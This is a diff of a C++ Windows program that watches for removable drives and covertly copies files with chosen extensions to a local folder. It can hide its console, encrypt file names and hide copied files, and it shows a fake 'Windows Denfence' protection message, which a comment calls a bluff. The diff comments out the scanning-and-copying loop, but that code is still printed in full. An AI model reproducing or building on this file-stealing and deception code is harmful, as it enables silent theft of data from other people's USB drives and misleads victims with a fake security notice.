@@ -24,13 +24,13 @@ const char targetExtension[][32]
 
 #define RESERVE_DIRECTORY	true	// * 连同目录一起复制
 #define LOG_FILE			true	// * 日志文件
-#define LF_LOCATION			""		// * 日志文件输出位置
+#define LF_DESTINATION		""		// * 日志文件输出位置
 #define DELAY_TIME			3		//扫描间隔时间(单位:秒)
 #define SHOW_CONSOLE		true	//是否显示控制台
 #define SHOW_FILES			true	//是否列出文件列表在控制台
 #define OVERWRITER			true	//是否覆盖已有文件
 #define FILENAME_ENCRYPT	true	// * 是否加密文件名(加密方式:键对值)
-#define FNE_MAP				"D:/"	//键对值文件输出位置
+#define FNE_MAP_DESTINATION	"D:/1.txt"	//键对值文件位置
 #define HIDE_FILE			false	//隐藏被复制的文件
 #define DESTINATION			"D:/"	//复制文件的目的地
 
@@ -109,55 +109,63 @@ void copyFiles(const char* src)
 
 int main()
 {
-	ifstream inputFile(FNE_MAP);
-
-
-
-
-
-
-	HWND hwnd = GetForegroundWindow();
-	if (SHOW_CONSOLE)
+	ifstream inputFile(FNE_MAP_DESTINATION);
+	char t[1024]{};
+	while (inputFile.getline(t, 1024))
 	{
-		ShowWindow(hwnd, SW_SHOW);
-	}
-	else
-	{
-		ShowWindow(hwnd, SW_HIDE);
+		cout << t << endl;
 	}
 
 
-again:
 
-	while (true)
-	{
-		char remDrvList[32][4]{};
-		int remDrvCount = 0;
 
-		remDrvCount = getRemovableDriver(remDrvList);
 
-		do
-		{
-			time_t t = time(nullptr);
-			char strTime[128]{};
-			ctime_s(strTime, 128, &t);
-			strTime[strlen(strTime) - 1] = (char)'\0';
-			//扯鬼
-			cout << "[" << strTime << "] Windows Denfence 正在保护你的电脑,请不要关闭该窗口" << endl;
-			Sleep(3 * 1000);
-		} while (remDrvCount == 0);
 
-		for (int i = 0; i < remDrvCount; i++)
-		{
-			try
-			{
-				copyFiles(remDrvList[i]);
-			}
-			catch (filesystem_error e)
-			{
-				cerr << e.what() << endl;
-				goto again;
-			}
-		}
-	}
+
+
+
+	//	HWND hwnd = GetForegroundWindow();
+	//	if (SHOW_CONSOLE)
+	//	{
+	//		ShowWindow(hwnd, SW_SHOW);
+	//	}
+	//	else
+	//	{
+	//		ShowWindow(hwnd, SW_HIDE);
+	//	}
+	//
+	//
+	//again:
+	//
+	//	while (true)
+	//	{
+	//		char remDrvList[32][4]{};
+	//		int remDrvCount = 0;
+	//
+	//		remDrvCount = getRemovableDriver(remDrvList);
+	//
+	//		do
+	//		{
+	//			time_t t = time(nullptr);
+	//			char strTime[128]{};
+	//			ctime_s(strTime, 128, &t);
+	//			strTime[strlen(strTime) - 1] = (char)'\0';
+	//			//扯鬼
+	//			cout << "[" << strTime << "] Windows Denfence 正在保护你的电脑,请不要关闭该窗口" << endl;
+	//			Sleep(3 * 1000);
+	//		} while (remDrvCount == 0);
+	//
+	//		for (int i = 0; i < remDrvCount; i++)
+	//		{
+	//			try
+	//			{
+	//				copyFiles(remDrvList[i]);
+	//			}
+	//			catch (filesystem_error e)
+	//			{
+	//				cerr << e.what() << endl;
+	//				goto again;
+	//			}
+	//		}
+	//	}
 }
